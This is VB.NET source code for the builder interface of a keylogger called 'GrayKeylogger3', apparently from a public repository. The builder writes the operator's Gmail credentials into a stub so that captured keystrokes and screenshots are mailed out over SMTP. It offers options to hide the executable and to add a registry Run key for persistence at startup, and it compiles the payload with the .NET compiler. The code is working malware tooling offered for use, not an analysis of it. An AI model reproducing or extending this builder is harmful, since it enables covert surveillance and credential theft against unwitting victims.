Imports System.Net.Mail, System.IO

Public Class GrayKeylogger3
    Public CurrentDir = AppDomain.CurrentDomain.BaseDirectory
    Public DotNetDir = Environ("windir") & "\Microsoft.NET\Framework\v4.0.30319\"
    Public IconPath = Nothing
    Public n = vbNewLine
    Public Sub SetCliArgues(Optional OutPath As String = Nothing)
        Dim IconCLI As String = If(File.Exists(IconPath), " /win32icon:""" & IconPath & """ ", Nothing)

        Dim CompilerExe As String = """" & DotNetDir & If(language.SelectedItem Is Nothing, Nothing, If(language.SelectedItem.Contains("Visual Basic"), "vbc.exe""", Nothing) & If(language.SelectedItem.Contains("C sharp"), "csc.exe""", Nothing)) & " "
        Dim targets As String = If(target.SelectedItem Is Nothing, Nothing, "/target:" & If(target.SelectedItem.Contains("WinExe"), "winexe", Nothing) & If(target.SelectedItem.Contains("Console"), "exe", Nothing) & If(target.SelectedItem.Contains("Library"), "library", Nothing)) & " /optimize "
        Dim Output As String = If(OutPath IsNot Nothing, "/out:""" & OutPath & """ ", Nothing)
        Dim ext As String = If(language.SelectedItem Is Nothing, Nothing, If(language.SelectedItem.Contains("Visual Basic"), "vb", Nothing) & If(language.SelectedItem.Contains("C sharp"), "cs", Nothing))
        Dim input As String = """" & CurrentDir & "Temp\temp." & ext & """"
        ArgueBox.Text = CompilerExe & IconCLI & targets & Output & input
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles ShowHide.Click
        pass.UseSystemPasswordChar = If(pass.UseSystemPasswordChar, False, True)
        ShowHide.Text = If(pass.UseSystemPasswordChar, "hide", "show")
    End Sub
    Private Sub Test_Click(sender As Object, e As EventArgs) Handles Test.Click
        If My.Computer.Network.IsAvailable Then
            Using Mail As New MailMessage With {.Subject = "Graykeylogger 3 Greetings"}
                Try
                    Mail.To.Add(user.Text & "@gmail.com")
                    Mail.From = New MailAddress(user.Text & "@gmail.com")
                    Mail.Body = "Greetings from GrayProgrammzerz and Darksec Developers." & n & "Email is working fine." & n & "Now you should move to next steps." & n & "Thanks"
                    Using SMTP As New SmtpClient("smtp.gmail.com") With {
                        .EnableSsl = True,
                        .Credentials = New Net.NetworkCredential(user.Text & "@gmail.com", pass.Text),
                        .Port = 587}
                        SMTP.Send(Mail)
                    End Using
                    MessageBox.Show(Me, "Message sent successfully, Please check your inbox.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Catch ex As Exception
                    MessageBox.Show(Me, "Please check whether lesssecureapps are allowed in your gmail." & vbNewLine & "And also Email and Password." & vbNewLine & "Error message was : " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                End Try
            End Using
        Else
            MessageBox.Show(Me, "Please check your internet connection.", "Connection Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        End If
    End Sub
    Sub SetVbTemplate()
        Dim stub As String = File.ReadAllText(CurrentDir & "Template\stub.vb")
        Dim Code = n &
        "Public logsize As Integer = " & logsize.Text & n &
        "Public ScrPath As String = Environ(""temp"") & ""\Scrnsht.Jpeg""" & n &
        "Public ScrQuality As Long = " & Quality.Value & "L" & n &
        "Public email As String = """ & user.Text & gmail.Text & """" & n &                                  'Email like example@gmail.com
        "Public Password As String = """ & pass.Text & """" & n &
         "Public ErrorReporting  As boolean = " & ErrorReporting.Checked & n &
        "Public Sub Main()" & n &
        "Dim location as string = Reflection.Assembly.GetExecutingAssembly.Location" & n &
        If(stealth.Checked, "File.SetAttributes(location, FileAttributes.Hidden)", "") & n &
         If(Startup.Checked, "Microsoft.Win32.Registry.CurrentUser.OpenSubKey(""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true).SetValue(""GrayKeylogger"", location)", "") & n


        File.WriteAllText(CurrentDir & "Temp\temp.vb", Replace(stub, "Public Sub Main()", Code))
    End Sub
    Sub SetCsharpTemplate()
        Dim stub As String = File.ReadAllText(CurrentDir & "Template\stub.cs")
        Dim Code = "public static int logsize = " & logsize.Text & ";" & n &
        "public static string ScrPath = Environment.GetEnvironmentVariable(""TMP"") + @""\Scrnsht.Jpeg"";" & n &
"public static long ScrQuality = " & Quality.Value & "L;" & n &
"public static string email = """ & user.Text & gmail.Text & """;" & n &
"public static string Password = """ & pass.Text & """;" & n &
"public static void Main(){" & n &
 If(stealth.Checked, "File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);", "") & n &
 If(Startup.Checked, "Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true).SetValue(""GrayKeylogger"", Application.ExecutablePath);", "") & n
        File.WriteAllText(CurrentDir & "Temp\temp.cs", Replace(stub, "public static void Main(){", Code))
    End Sub
    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://myaccount.google.com/lesssecureapps")
    End Sub
    Private Sub Build_Click(sender As Object, e As EventArgs) Handles Build.Click
        Try
            If Not Directory.Exists(CurrentDir & "Temp") Then Directory.CreateDirectory(CurrentDir & "Temp")
            If language.SelectedItem.Contains("Visual Basic") Then
                SetVbTemplate()
            ElseIf language.SelectedItem.Contains("C sharp") Then
                SetCsharpTemplate()
            End If

            Dim SaveFile As New SaveFileDialog
            SaveFile.ShowHelp = True
            SaveFile.Filter = "Files | *." & If(target.SelectedItem.Contains("WinExe"), "exe", Nothing) & If(target.SelectedItem.Contains("Console"), "exe", Nothing) & If(target.SelectedItem.Contains("Library"), "dll", Nothing)
            If SaveFile.ShowDialog = Windows.Forms.DialogResult.OK Then
                SetCliArgues(SaveFile.FileName)
                File.WriteAllText(CurrentDir & "Temp\compiler.bat",
                                  "echo off & color 0E & echo on" & n &
                                  ArgueBox.Text & n &
                                  "echo off & color 0a & pause")
                Process.Start(CurrentDir & "Temp\compiler.bat")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Readme.Click
        Process.Start("https://github.com/graysuit/gray-keylogger-2")
    End Sub

    Private Sub Quality_Scroll(sender As Object, e As EventArgs) Handles Quality.Scroll
        SetCliArgues()
        QualityPercentage.Text = Quality.Value & "%"
    End Sub

    Private Sub language_SelectedIndexChanged(sender As Object, e As EventArgs) Handles language.SelectedIndexChanged
        SetCliArgues()
    End Sub
    Sub logs(ByVal log As String, ByVal append As Boolean)
        If append Then
            File.AppendAllText(CurrentDir & "logs.txt", log)
        Else
            File.WriteAllText(CurrentDir & "logs.txt", log)
        End If
    End Sub
    Private Sub target_SelectedIndexChanged(sender As Object, e As EventArgs) Handles target.SelectedIndexChanged
        SetCliArgues()
    End Sub

    Sub SetSettings(ShoulSave As Boolean)
        If ShoulSave Then
            My.Settings.logsize = logsize.Text
            My.Settings.target = target.SelectedItem
            My.Settings.stealth = stealth.Checked
            My.Settings.email = user.Text
            My.Settings.language = language.SelectedItem
            My.Settings.quality = Quality.Value
            My.Settings.ErrorReporting = ErrorReporting.Checked
            My.Settings.startup = Startup.Checked
        Else
            logsize.Text = My.Settings.logsize
            target.SelectedItem = My.Settings.target
            stealth.Checked = My.Settings.stealth
            user.Text = My.Settings.email
            language.SelectedItem = My.Settings.language
            Quality.Value = My.Settings.quality
            ErrorReporting.Checked = My.Settings.ErrorReporting
            Startup.Checked = My.Settings.startup
        End If
        QualityPercentage.Text = Quality.Value & "%"
        My.Settings.Save()
    End Sub
    Private Sub Form1_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        logs(Nothing, False)
        SetSettings(False)
    End Sub
    Private Sub Form1_Closing(sender As Object, e As EventArgs) Handles MyBase.Closing
        SetSettings(True)
    End Sub

    Private Sub icon_CheckedChanged(sender As Object, e As EventArgs) Handles iconbox.CheckedChanged
        If iconbox.Checked Then
            Dim OpenFile As New OpenFileDialog
            OpenFile.ShowHelp = True
            OpenFile.Filter = "Icons | *.ico"
            If OpenFile.ShowDialog = Windows.Forms.DialogResult.OK Then
                IconPath = OpenFile.FileName
            Else
                iconbox.Checked = False
            End If
        End If
    End Sub
End Class
